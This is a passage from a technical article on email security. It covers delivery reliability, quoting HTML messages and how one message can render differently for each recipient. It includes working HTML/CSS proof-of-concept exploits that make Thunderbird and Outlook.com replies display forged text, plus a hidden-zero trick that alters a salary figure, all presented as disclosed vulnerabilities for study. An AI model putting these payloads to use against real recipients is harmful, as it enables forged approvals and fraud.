the confidentiality of a message at least after it has been transmitted:</p>

<figure>
  <p><img src="https://evalapply.org/pages/email/generated/gmail-message-details.png"/>
    

</p>

  <figcaption>You can click on the little triangle to see more details in <a href="https://support.google.com/mail/answer/180707">Gmail’s web interface</a>. <code>mailed-by</code> indicates a successful <a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr> check</a>, <code>signed-by</code> a valid <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr> signature</a>. <code>security</code> indicates that the outgoing mail server of the sender used <a href="#starttls-extension"><abbr title="Command to Start Transport Layer Security when available">STARTTLS</abbr></a>.</figcaption>

</figure>

<h4 id="reliable-delivery-availability">Reliable delivery (availability)</h4>

<p>Besides confidentiality and integrity, <a href="https://en.wikipedia.org/wiki/Information_security">information security</a>
is also concerned with the availability of a service.
Since your message might be silently <a href="#heuristics">discarded as spam</a>
or land in the recipient’s spam folder, which they don’t check on a regular basis,
you can never be certain that a (new) recipient received your message in their inbox.
Most people minimize this risk by <a href="#reputation">not hosting their emails themselves</a>.
Once <a href="#domain-authentication">domain authentication</a> is commonplace,
which solves the problem of <a href="#backscatter">backscatter</a>,
we can hopefully fight <a href="#spam">spam</a> with <a href="#challenges">other techniques</a>
so that self-hosting becomes feasible again.</p>

<p>Custom <a href="#email-filtering">email filters</a> are another source of unreliability.
When users receive too many emails which they don’t want or can’t handle,
they are tempted to set up a rule which moves or deletes them automatically.
Personally, I have a rule which deletes all messages
which contain certain keywords, such as “lotto winner”, in their subject.
I’ve recently also added some <a href="https://en.wikipedia.org/wiki/Top-level_domain">top-level domains</a>,
such as <code>.cheap</code> and <code>.city</code>, to this list.
If the <code>From</code> address ends in one of these domains, the message is deleted immediately.
My custom anti-spam rule, which also includes the domains of sales companies, does wonders for my inbox.
The problem with custom email filters, though, is that they often work
like <a href="https://en.wikipedia.org/wiki/Shotgun">shotguns</a>:
They certainly hit the messages you wanted to remove from your inbox,
but due to their simplicity, they likely bring down legitimate messages as well.
As long as senders send emails automatically, recipients will remove them automatically.
Casualties are to be expected in such a setup.</p>

<h4 id="quoting-html-messages">Quoting <abbr title="HyperText Markup Language">HTML</abbr> messages</h4>

<p><a href="#html-emails"><abbr title="HyperText Markup Language">HTML</abbr> emails</a> can be <a href="#email-styling">styled</a>.
When you reply to or forward such an email, your mail client has to make sure
that the quoted message cannot change the appearance of your own message.
If the quoted message isn’t escaped properly,
an attacker can inject text into the victim’s response.
When quoting an <abbr title="HyperText Markup Language">HTML</abbr> message, mail clients need to ensure the following two things:</p>
<ul>
  <li><strong>Scoped styles</strong>: The style of the quoted message may not leak into the surrounding message.
If the quoted message uses the <a href="#email-styling"><code>&lt;link&gt;</code> or <code>&lt;style&gt;</code> element</a> for styling,
these styles have to be scoped to the quoted message.
Achieving this would be trivial if the
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/style#attr-scoped"><code>scoped</code> attribute</a> wasn’t removed
from the <a href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element"><abbr title="HyperText Markup Language">HTML</abbr> specification</a>.
If we’re lucky, we might get an <a href="https://github.com/w3c/csswg-drafts/issues/3547"><code>@scope</code> selector</a>
in a future <abbr title="Cascading Style Sheets">CSS</abbr> standard. Browser started to support the
<a href="https://developer.mozilla.org/en-US/docs/Web/Web_Components/Using_shadow_DOM">Shadow DOM <abbr title="Application Programming Interface">API</abbr></a>,
which can be used to encapsulate components with JavaScript.
Since mail clients don’t support JavaScript,
we have to wait until we can <a href="https://web.dev/declarative-shadow-dom/">declare a Shadow DOM in <abbr title="HyperText Markup Language">HTML</abbr></a>.
So how do mail clients handle this?
Gmail simply removes the <code>&lt;style&gt;</code> element when quoting an <abbr title="HyperText Markup Language">HTML</abbr> message.
If you want to make sure that your message is still displayed properly when it is replied to or forwarded,
you have to keep <a href="#email-styling">inlining the styles</a>.
Apple Mail inlines internal <abbr title="Cascading Style Sheets">CSS</abbr> when quoting an <abbr title="HyperText Markup Language">HTML</abbr> message.
Yahoo Mail moves the <code>&lt;style&gt;</code> element from the <code>&lt;head&gt;</code> into the <code>&lt;body&gt;</code>
and prefixes each rule with an <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/id">ID</a>,
which it also assigns to the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/div"><code>&lt;div&gt;</code> element</a>
which contains the quoted message.
Thunderbird only moves the <code>&lt;style&gt;</code> element from the <code>&lt;head&gt;</code> into the <code>&lt;body&gt;</code>
and thus <a href="#thunderbird-example-exploit">fails to scope the styles</a>.
Outlook.com behaves differently for replies and forwarded messages:
It <a href="#outlook.com-example-exploit">fails like Thunderbird</a> in the former case
and inline styles incorrectly in the latter case.</li>
  <li><strong>No overlays</strong>: <abbr title="Cascading Style Sheets">CSS</abbr> can be used to move <abbr title="HyperText Markup Language">HTML</abbr> elements away from their default position in a document.
This becomes a problem when <abbr title="HyperText Markup Language">HTML</abbr> elements in the quoted message can be moved above the
<a href="https://en.wikipedia.org/wiki/Posting_style#Attribution_lines">attribution line</a>
since email users are trained to perceive everything above the attribution line
as coming from the sender of the message.
I can think of three ways how <abbr title="HyperText Markup Language">HTML</abbr> elements can be moved around with <abbr title="Cascading Style Sheets">CSS</abbr>,
but I wouldn’t be surprised if <abbr title="Cascading Style Sheets">CSS</abbr> has more ways to achieve this.
Firstly, there is the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/position"><code>position</code> property</a>,
with which elements can be moved relative to their default position or to an absolute position in the document.
Secondly, the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/transform"><code>transform</code> property</a>
can be used to <code>translate</code> <abbr title="HyperText Markup Language">HTML</abbr> elements (and to <code>scale</code> and to <code>rotate</code> them).
Thirdly, <a href="https://www.quirksmode.org/blog/archives/2020/02/negative_margin.html">negative margins</a>
have a similar effect as <code>position: relative;</code>.
Without having tested all possibilities,
I have the impression that <a href="#webmail">webmail clients</a> handle this quite well.
For example, Gmail doesn’t list <code>position</code> and <code>transform</code> under
<a href="https://developers.google.com/gmail/design/reference/supported_css">supported <abbr title="Cascading Style Sheets">CSS</abbr> properties</a>
and also removes negative margins before displaying a message.
Desktop clients, on the other hand, struggle with this.
<code>position: absolute;</code> and <code>margin-top: -200px;</code> work in Apple Mail and in Thunderbird.
Restricting styles to inline <abbr title="Cascading Style Sheets">CSS</abbr> isn’t enough to scope the styles.
Doing so would make it more difficult, though,
to show the injected text only in the reply but not when composing the reply.</li>
</ul>

<p>If analyzing the <a href="#raw-message">raw message</a>
before forwarding or replying to a message is too much to ask from you,
you have only two options to avoid these issues:
Choose a mail client which cares about your security
or enforce that all messages are composed in plaintext.
Apple Mail allows you to configure this in the “Composing” tab of your “Preferences”:
Change the “Message format” to “Plain text” and disable “Use the same message format as the original message”.
If you use Thunderbird, you can disable “Compose messages in <abbr title="HyperText Markup Language">HTML</abbr> format”
under the “Composition &amp; Addressing” tab of your “Account Settings”.</p>

<details>
  <summary id="thunderbird-example-exploit">
Thunderbird example exploit
</summary>

  <p>If you reply to or forward the following message with “No, I don’t.” in Thunderbird,
the recipient will see “Yes, I do.” instead.
If you have already disabled the composition of messages in <abbr title="HyperText Markup Language">HTML</abbr>,
you have to press “Shift” when you click on the “Reply” or the “Forward” button.
For this particular attack to work, the message has to be composed in the “Paragraph” style.</p>

  <figure>

    <div><div><pre><code><span>&lt;html&gt;</span>
  <span>&lt;head&gt;</span>
    <span>&lt;style </span><span>type=</span><span>&#34;text/css&#34;</span><span>&gt;</span>
      <span>p</span> <span>{</span> <span>font-size</span><span>:</span> <span>0</span><span>;</span> <span>}</span>
      <span>p</span><span>::before</span> <span>{</span> <span>content</span><span>:</span> <span>&#39;Yes, I do.&#39;</span><span>;</span> <span>font-size</span><span>:</span> <span>initial</span><span>;</span> <span>}</span>
      <span>p</span> <span>+</span> <span>p</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
      <span>p</span><span>[</span><span>_moz_dirty</span><span>]</span> <span>{</span> <span>display</span><span>:</span> <span>block</span><span>;</span> <span>font-size</span><span>:</span> <span>initial</span><span>;</span> <span>}</span>
      <span>p</span><span>[</span><span>_moz_dirty</span><span>]</span><span>::before</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
    <span>&lt;/style&gt;</span>
  <span>&lt;/head&gt;</span>
  <span>&lt;body&gt;</span>
    <span>&lt;div&gt;</span>Hello, do you like my proposal?<span>&lt;/div&gt;</span>
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre></div>    </div>

    <figcaption>

How to exploit Thunderbird’s failure to scope the styles of the quoted message.
<a href="#tool-protocol-esmtp&amp;content=text%2Fhtml&amp;body=%3Chtml%3E%0A++%3Chead%3E%0A++++%3Cstyle+type%3D%22text%2Fcss%22%3E%0A++++++p+%7B+font-size%3A+0%3B+%7D%0A++++++p%3A%3Abefore+%7B+content%3A+%27Yes%2C+I+do.%27%3B+font-size%3A+initial%3B+%7D%0A++++++p+%2B+p+%7B+display%3A+none%3B+%7D%0A++++++p%5B_moz_dirty%5D+%7B+display%3A+block%3B+font-size%3A+initial%3B+%7D%0A++++++p%5B_moz_dirty%5D%3A%3Abefore+%7B+display%3A+none%3B+%7D%0A++++%3C%2Fstyle%3E%0A++%3C%2Fhead%3E%0A++%3Cbody%3E%0A++++%3Cdiv%3EHello%2C+do+you+like+my+proposal%3F%3C%2Fdiv%3E%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E" title="Set the body of the ESMTP tool to this Thunderbird exploit example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.
The attack uses the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/::before"><code>::before</code> pseudo-element</a>
to inject the text, and <code>p[_moz_dirty]</code> to hide the injected text during composition.

</figcaption>
  </figure>

  <p>You can also use this attack to frame your boss so that it appears to someone in <code>Cc</code>
as if the boss authorized a payment or some holiday.
Unfortunately for the attacker, the content preview in the message list still shows “No, I don’t.”.
Moreover, the exploit becomes apparent if the recipient inspects the raw message.
While the attack isn’t perfect, the problem is certainly worrying and should be fixed.
I reported <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1688659">this vulnerability</a>
to the Thunderbird team on 25 January 2021,
and they decided to make the report public without a fix.
There are some related issues with quoting <abbr title="HyperText Markup Language">HTML</abbr> messages,
which I’ll cover in the <a href="#different-appearances">next subsection</a>.</p>

</details>

<details>
  <summary id="outlook.com-example-exploit">
Outlook.com example exploit
</summary>

  <p>If you reply to the following message with “No, I don’t.” on <a href="https://outlook.com/">Outlook.com</a>,
the recipient will see “Yes, I do.” on other clients.</p>

  <figure>

    <div><div><pre><code><span>&lt;html&gt;</span>
  <span>&lt;head&gt;</span>
    <span>&lt;style </span><span>type=</span><span>&#34;text/css&#34;</span><span>&gt;</span>
      <span>div</span><span>[</span><span>style</span><span>]</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
      <span>hr</span> <span>{</span> <span>border</span><span>:</span> <span>0</span><span>;</span> <span>}</span>
      <span>hr</span><span>:before</span> <span>{</span> <span>content</span><span>:</span> <span>&#39;Yes, I do.&#39;</span><span>;</span> <span>display</span><span>:</span> <span>block</span><span>;</span> <span>border-bottom</span><span>:</span> <span>1px</span> <span>solid</span><span>;</span> <span>}</span>
    <span>&lt;/style&gt;</span>
  <span>&lt;/head&gt;</span>
  <span>&lt;body&gt;</span>
    <span>&lt;div&gt;</span>Hello, do you like my proposal?<span>&lt;/div&gt;</span>
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre></div>    </div>

    <figcaption>

How to exploit Outlook.com’s failure to scope the styles of the quoted message.
<a href="#tool-protocol-esmtp&amp;content=text%2Fhtml&amp;body=%3Chtml%3E%0A++%3Chead%3E%0A++++%3Cstyle+type%3D%22text%2Fcss%22%3E%0A++++++div%5Bstyle%5D+%7B+display%3A+none%3B+%7D%0A++++++hr+%7B+border%3A+0%3B+%7D%0A++++++hr%3Abefore+%7B+content%3A+%27Yes%2C+I+do.%27%3B+display%3A+block%3B+border-bottom%3A+1px+solid%3B+%7D%0A++++%3C%2Fstyle%3E%0A++%3C%2Fhead%3E%0A++%3Cbody%3E%0A++++%3Cdiv%3EHello%2C+do+you+like+my+proposal%3F%3C%2Fdiv%3E%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E" title="Set the body of the ESMTP tool to this Outlook.com exploit example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.
Since Outlook.com doesn’t copy styles like <code>div[style]:before</code> and <code>div:first-child:before</code> to the reply,
I had to abuse the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/hr"><code>&lt;hr&gt;</code> element</a>
to make the injected text appear only once.

</figcaption>
  </figure>

  <p>If you click on “Forward”, Outlook.com inlines the <abbr title="Cascading Style Sheets">CSS</abbr>.
However, it calls the inlining function on the quoted message wrapped with the attribution line
instead of the original message.
By adding the style <code>b { display: none !important; }</code>,
the sender can hide the parts which are generated by Outlook.com,
such as “From:”, “Sent:”, “To:”, and “Subject:”.</p>

  <p>I reported both problems to Microsoft on 25 January 2021.
The report was closed within a couple of hours,
apparently because it lacked a valid proof of concept.
I immediately objected to this assessment
and got the following response from Microsoft two weeks later on 8 February 2021:</p>

  <blockquote>
    <p>Thank you for your security research and submissions to Microsoft.
The severity of this issue recently was reviewed
and determined to be below the bar for further servicing as an <abbr title="Microsoft Security Response Center">MSRC</abbr> case.
At this time we are closing this case and will not provide further updates on this issue,
however it may be addressed in a future version of our products.</p>
  </blockquote>

</details>

<h4 id="different-appearances">Different appearances</h4>

<p>Another issue with email is that the same message can appear differently to different recipients.
This is a problem whenever you refer to the content of an earlier message,
no matter whether you <a href="#quoting-html-messages">quote the message</a>
or reference it in the <a href="#message-identification"><code>In-Reply-To</code> header field</a>.
Until mail clients address this issue, you must repeat the content you refer to.
Emails can appear differently for three reasons:</p>
<ul>
  <li>
    <p><code>multipart/alternative</code>:
<a href="#multipart-messages">Multipart messages</a> can include different versions of the same content
so that the mail client of the recipient can display the last version
whose <a href="#content-type">content type</a> it supports.
However, nothing guarantees that the various parts contain the same content.
<a href="#heuristics">Spam filters</a> might flag messages whose alternative parts diverge too much from one another,
but determining whether different parts contain the same content is more difficult than it seems.
Let’s look at an example:</p>

    <figure>
      <div><div><pre><code><span>&lt;html&gt;</span>
  <span>&lt;body&gt;</span>
    Hi boss, can you confirm to our accountant in Cc that my monthly salary is
    increased by USD 100<span>&lt;span</span> <span>style=</span><span>&#34;font-size: 0;&#34;</span><span>&gt;</span>0<span>&lt;/span&gt;</span> starting next month?
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre></div>      </div>
      <figcaption>
A simple <abbr title="HyperText Markup Language">HTML</abbr> message whose plaintext version conveys a different content.
<a href="#tool-protocol-esmtp&amp;content=text%2Fhtml&amp;body=%3Chtml%3E%0A++%3Cbody%3E%0A++++Hi+boss%2C+can+you+confirm+to+our+accountant+in+Cc+that+my+monthly+salary+is%0A++++increased+by+USD+100%3Cspan+style%3D%22font-size%3A+0%3B%22%3E0%3C%2Fspan%3E+starting+next+month%3F%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E" title="Set the body of the ESMTP tool to this example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.
</figcaption>
    </figure>

    <p>If your boss uses an <abbr title="HyperText Markup Language">HTML</abbr>-capable mail client, they will see <code>USD 100</code> in the message.
When your boss replies to this message with “Yes, that’s what we agreed.”,
all the mail clients I usually mention in this article
generate a <code>Content-Type: text/plain</code> version of the reply, which includes <code>USD 1000</code>.
If you know that your accountant uses a plaintext-only mail client, this attack will work.
On most <abbr title="HyperText Markup Language">HTML</abbr>-capable mail clients,
you can see the plaintext version only by inspecting the <a href="#raw-message">raw message</a>.
Thunderbird, however, allows you to change which part is being displayed by
switching the “Message Body As” in the “View” menu.
If you use <code>display: none;</code> instead of <code>font-size: 0;</code>,
Apple Mail won’t include the additional zero in the plaintext reply as it uses something
like <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/innerText"><code>innerText</code></a>
to determine the plaintext content.
There are plenty of ways to <a href="#hide-content-with-css">hide content with <abbr title="Cascading Style Sheets">CSS</abbr></a>, though,
and the plaintext conversion algorithm would have to consider them all.
Since computing what is actually being displayed is impractical,
the solution has to be to force all content to render in <abbr title="HyperText Markup Language">HTML</abbr> messages by disabling those <abbr title="Cascading Style Sheets">CSS</abbr> properties.
Since already the original message could have contained conflicting alternative parts,
mail clients which take security seriously should probably warn their users
when they reply to <code>multipart/alternative</code> messages
because most mail clients hide the quoted messages in email conversations.
All the mail clients I’ve tested generate the quoted message in the plaintext part of the reply
from the <abbr title="HyperText Markup Language">HTML</abbr> part that they’ve displayed to the user.
If it wasn’t for malicious <abbr title="Cascading Style Sheets">CSS</abbr> styles, mail clients wouldn’t prepend your reply to content you haven’t seen.
The only problem that remains is that the <code>In-Reply-To</code> header field doesn’t specify
which alternative part your message refers to.</p>
  </li>
  <li>
    <p><strong>Conditional styles</strong>:
Even without alternative parts, the same message can be rendered differently on different devices
due to <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Media_Queries/Using_media_queries">media queries</a>.
The following message shows a different text on devices with a small screen than on devices with a large screen:</p>

    <figure>
      <div><div><pre><code><span>&lt;html&gt;</span>
  <span>&lt;head&gt;</span>
    <span>&lt;style </span><span>type=</span><span>&#34;text/css&#34;</span><span>&gt;</span>
      <span>@media</span> <span>(</span><span>max-width</span><span>:</span> <span>599px</span><span>)</span> <span>{</span>
        <span>.large</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
      <span>}</span>
      <span>@media</span> <span>(</span><span>min-width</span><span>:</span> <span>600px</span><span>)</span> <span>{</span>
        <span>.small</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
      <span>}</span>
      <span>.touch</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
      <span>@media</span> <span>(</span><span>pointer</span><span>:</span> <span>coarse</span><span>)</span> <span>{</span>
        <span>.touch</span> <span>{</span> <span>display</span><span>:</span> <span>inline</span><span>;</span> <span>}</span>
      <span>}</span>
    <span>&lt;/style&gt;</span>
  <span>&lt;/head&gt;</span>
  <span>&lt;body&gt;</span>
    <span>&lt;p&gt;</span>
      You have a
      <span>&lt;span</span> <span>class=</span><span>&#34;large&#34;</span><span>&gt;</span>large<span>&lt;/span&gt;</span>
      <span>&lt;span</span> <span>class=</span><span>&#34;small&#34;</span><span>&gt;</span>small<span>&lt;/span&gt;</span>
      <span>&lt;span</span> <span>class=</span><span>&#34;touch&#34;</span><span>&gt;</span>touch<span>&lt;/span&gt;</span>
      screen.
    <span>&lt;/p&gt;</span>
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre></div>      </div>
      <figcaption>
A simple <abbr title="HyperText Markup Language">HTML</abbr> message which is displayed differently on different devices.
<a href="#tool-protocol-esmtp&amp;content=text%2Fhtml&amp;body=%3Chtml%3E%0A++%3Chead%3E%0A++++%3Cstyle+type%3D%22text%2Fcss%22%3E%0A++++++%40media+%28max-width%3A+599px%29+%7B%0A++++++++.large+%7B+display%3A+none%3B+%7D%0A++++++%7D%0A++++++%40media+%28min-width%3A+600px%29+%7B%0A++++++++.small+%7B+display%3A+none%3B+%7D%0A++++++%7D%0A++++++.touch+%7B+display%3A+none%3B+%7D%0A++++++%40media+%28pointer%3A+coarse%29+%7B%0A++++++++.touch+%7B+display%3A+inline%3B+%7D%0A++++++%7D%0A++++%3C%2Fstyle%3E%0A++%3C%2Fhead%3E%0A++%3Cbody%3E%0A++++%3Cp%3E%0A++++++You+have+a%0A++++++%3Cspan+class%3D%22large%22%3Elarge%3C%2Fspan%3E%0A++++++%3Cspan+class%3D%22small%22%3Esmall%3C%2Fspan%3E%0A++++++%3Cspan+class%3D%22touch%22%3Etouch%3C%2Fspan%3E%0A++++++screen.%0A++++%3C%2Fp%3E%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E" title="Set the body of the ESMTP tool to this example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.
</figcaption>
    </figure>

    <p>Media queries are useful to design websites for various screen sizes,
which is known as <a href="https://en.wikipedia.org/wiki/Responsive_web_design">responsive web design</a>.
Since emails are read on a wide variety of devices,
media queries are an important technique to make them look good on all devices.
Since media queries and <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Reference#selectors">selectors</a>
aren’t allowed in the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/style"><code>style</code> attribute</a>,
conditional rendering is much easier in mail clients which support <a href="#email-styling">internal or external <abbr title="Cascading Style Sheets">CSS</abbr></a>,
which is the <a href="https://www.campaignmonitor.com/css/style-element/style-in-head/">vast majority</a> by now.
In order to <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1530106">prevent this attack</a>,
Thunderbird no longer supports media queries.
In my opinion, this is the wrong approach
and the fix should rather be to force all content to render.
Styles should affect only how content is displayed, not which content is being displayed.
The <a href="https://www.campaignmonitor.com/css/properties/media-queries/">supported media features</a> vary greatly among clients.
For example, the screen width media queries are supported by
Gmail, Outlook.com, Yahoo Mail, and Apple Mail (also on iOS).
The <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@media/pointer"><code>pointer</code> media query</a>,
which can be used to detect a <a href="https://en.wikipedia.org/wiki/Touchscreen">touch screen</a>,
is removed by the Gmail and Yahoo Mail webclients.</p>
  </li>
  <li>
    <p><strong>Different implementations</strong>:
As long as different users use different mail clients which sanitize emails differently,
attackers can draft messages which are displayed differently to different recipients.
Since it’s easy to learn <a href="#sender-towards-recipients">which mail client someone uses</a>,
it’s often not difficult to have some part of a message be shown or hidden for a specific recipient.
I’ve drafted such a message for you:</p>

    <figure>
      <div><div><pre><code><span>&lt;html&gt;</span>
  <span>&lt;head&gt;</span>
    <span>&lt;style </span><span>type=</span><span>&#34;text/css&#34;</span><span>&gt;</span>
      <span>.apple-mail</span><span>,</span> <span>.outlook</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
      <span>@media</span> <span>(</span><span>pointer</span><span>)</span> <span>{</span>
        <span>.apple-mail</span> <span>{</span> <span>display</span><span>:</span> <span>inline</span><span>;</span> <span>}</span>
        <span>div</span> <span>.apple-mail</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
        <span>div</span> <span>.outlook</span> <span>{</span> <span>display</span><span>:</span> <span>inline</span><span>;</span> <span>}</span>
      <span>}</span>
      <span>@media</span> <span>(</span><span>min-width</span><span>:</span> <span>0px</span><span>)</span> <span>{</span>
        <span>.thunderbird</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
      <span>}</span>
      <span>p</span><span>:first-child</span> <span>.gmail</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
      <span>.yahoo-mail</span> <span>{</span> <span>display</span><span>:</span> <span>none</span><span>;</span> <span>}</span>
      <span>p</span><span>:first-child</span> <span>.yahoo-mail</span> <span>{</span> <span>display</span><span>:</span> <span>inline</span><span>;</span> <span>}</span>
      <span>body</span> <span>.yahoo-mail</span> <span>{</span> <span>display</span><span>:</span> <span>none</span> <span>!important</span><span>;</span> <span>}</span>
    <span>&lt;/style&gt;</span>
  <span>&lt;/head&gt;</span>
  <span>&lt;body&gt;</span>
    <span>&lt;p&gt;</span>
      You&#39;re reading this message
      <span>&lt;span</span> <span>class=</span><span>&#34;apple-mail&#34;</span><span>&gt;</span>in Apple Mail.<span>&lt;/span&gt;</span>
      <span>&lt;span</span> <span>class=</span><span>&#34;thunderbird&#34;</span><span>&gt;</span>in Thunderbird.<span>&lt;/span&gt;</span>
      <span>&lt;span</span> <span>class=</span><span>&#34;gmail&#34;</span><span>&gt;</span>on mail.google.com.<span>&lt;/span&gt;</span>
      <span>&lt;span</span> <span>class=</span><span>&#34;outlook&#34;</span><span>&gt;</span>on outlook.live.com.<span>&lt;/span&gt;</span>
      <span>&lt;span</span> <span>class=</span><span>&#34;yahoo-mail&#34;</span><span>&gt;</span>on mail.yahoo.com.<span>&lt;/span&gt;</span>
    <span>&lt;/p&gt;</span>
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre></div>      </div>
      <figcaption>
A simple <abbr title="HyperText Markup Language">HTML</abbr> message which is displayed differently by different clients.
<a href="#tool-protocol-esmtp&amp;content=text%2Fhtml&amp;body=%3Chtml%3E%0A++%3Chead%3E%0A++++%3Cstyle+type%3D%22text%2Fcss%22%3E%0A++++++.apple-mail%2C+.outlook+%7B+display%3A+none%3B+%7D%0A++++++%40media+%28pointer%29+%7B%0A++++++++.apple-mail+%7B+display%3A+inline%3B+%7D%0A++++++++div+.apple-mail+%7B+display%3A+none%3B+%7D%0A++++++++div+.outlook+%7B+display%3A+inline%3B+%7D%0A++++++%7D%0A++++++%40media+%28min-width%3A+0px%29+%7B%0A++++++++.thunderbird+%7B+display%3A+none%3B+%7D%0A++++++%7D%0A++++++p%3Afirst-child+.gmail+%7B+display%3A+none%3B+%7D%0A++++++.yahoo-mail+%7B+display%3A+none%3B+%7D%0A++++++p%3Afirst-child+.yahoo-mail+%7B+display%3A+inline%3B+%7D%0A++++++body+.yahoo-mail+%7B+display%3A+none+%21important%3B+%7D%0A++++%3C%2Fstyle%3E%0A++%3C%2Fhead%3E%0A++%3Cbody%3E%0A++++%3Cp%3E%0A++++++You%27re+reading+this+message%0A++++++%3Cspan+class%3D%22apple-mail%22%3Ein+Apple+Mail.%3C%2Fspan%3E%0A++++++%3Cspan+class%3D%22thunderbird%22%3Ein+Thunderbird.%3C%2Fspan%3E%0A++++++%3Cspan+class%3D%22gmail%22%3Eon+mail.google.com.%3C%2Fspan%3E%0A++++++%3Cspan+class%3D%22outlook%22%3Eon+outlook.live.com.%3C%2Fspan%3E%0A++++++%3Cspan+class%3D%22yahoo-mail%22%3Eon+mail.yahoo.com.%3C%2Fspan%3E%0A++++%3C%2Fp%3E%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E" title="Set the body of the ESMTP tool to this example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.
</figcaption>
    </figure>
  </li>
</ul>

<p>As long as not all mail clients prevent senders from <a href="#hide-content-with-css">hiding content with <abbr title="Cascading Style Sheets">CSS</abbr></a>,
<a href="#email-styling">email styling</a> can be abused.
Don’t we have the same problem with websites?
In principle, yes, but the difference lies in the expectation of users.
On the Web, you know that pages are often customized and that their content can change at any moment.
In the case of email, however, you expect that everyone sees the same content,
especially when you <a href="#quoting-html-messages">quote another message</a>.
If you reply to messages without quoting them,
an attacker can deliver a different message with the same
<a href="#message-identification"><code>Message-ID</code></a> to each of the recipients.
As I wrote <a href="#recipients">earlier</a>:
Just because someone is listed as another recipient
doesn’t mean that they received the same message as you.
The abuse of conditional <abbr title="Cascading Style Sheets">CSS</abbr> rules as a signing oracle was discovered and published by
<a href="https://arxiv.org/abs/1904.07550">Jens Müller and his colleagues</a> in 2019.
The problem with diverging <code>multipart/alternative</code> parts was discussed thereafter
in <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1530106">this Thunderbird issue</a>.</p>

<details>
  <summary id="hide-content-with-css">
Hide content with <abbr title="Cascading Style Sheets">CSS</abbr>
</summary>

  <p>There are plenty of ways to hide text and other content with <abbr title="Cascading Style Sheets">CSS</abbr>.
While this is useful on the Web, where you can have dynamic content,
there is no reason to allow hidden content in emails,
where you can’t unhide it with JavaScript.
(I know that one can accomplish amazing things with only <abbr title="Cascading Style Sheets">CSS</abbr>,
such as <a href="https://stackblitz.com/edit/medium-tabs?file=style.css">tabbed areas</a>,
but do we really need this in emails?)
Jens Müller and his co-authors included the following table of content-hiding <abbr title="Cascading Style Sheets">CSS</abbr> properties
in <a href="https://arxiv.org/abs/1904.07550">their paper</a>,
which I simplified and extended for you:</p>

  <figure>

    <table>
      <thead>
        <tr>
          <th>Property</th>
          <th>Value(s)</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/display"><code>display</code></a></td>
          <td><code>none</code></td>
        </tr>
        <tr>
          <td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/visibility"><code>visibility</code></a></td>
          <td><code>hidden</code> or <code>collapse</code></td>
        </tr>
        <tr>
          <td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/font"><code>font</code></a>[<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/font-size"><code>-size</code></a>]</td>
          <td><code>0</code> [<code>Helvetica</code>] (also when combined with a <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Values_and_Units#Distance_units">distance unit</a> or the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Values_and_Units#percentages">percentage sign</a>)</td>
        </tr>
        <tr>
          <td><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/color"><code>color</code></a></td>
